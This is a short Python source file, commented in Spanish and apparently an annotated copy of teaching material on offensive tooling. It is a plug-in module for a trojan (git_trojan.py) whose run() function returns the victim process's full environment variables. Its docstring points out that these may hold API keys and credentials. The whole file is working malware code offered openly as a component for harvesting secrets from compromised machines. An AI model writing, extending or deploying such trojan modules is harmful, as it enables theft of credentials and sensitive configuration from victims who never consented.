"""
environment.py - Módulo de troyano: variables de entorno
=========================================================
Módulo pensado para ser cargado dinámicamente por un troyano
(p. ej. git_trojan.py). Expone una función `run(**args)` que devuelve
el mapeado completo de variables de entorno del proceso víctima.

Las variables de entorno pueden contener rutas, claves de API,
credenciales o configuración sensible del sistema operativo.

ERRORES CORREGIDOS:
    - Sin errores; el código original es correcto.
      Se añaden docstrings y comentarios explicativos.

REQUISITOS:
    - Python 3.x (solo biblioteca estándar)

EJEMPLOS DE EJECUCIÓN:
    python -c "import environment; print(environment.run())"
"""

import os


def run(**args):
    """
    Obtiene las variables de entorno del proceso actual.

    Args:
        **args: Parámetros opcionales (ignorados; mantienen la interfaz
                genérica del protocolo de módulos del troyano).

    Returns:
        os._Environ: Objeto tipo diccionario con todas las variables de
                     entorno (PATH, HOME, USERNAME, etc.).
    """
    print("[*] En el módulo environment.")
    return os.environ
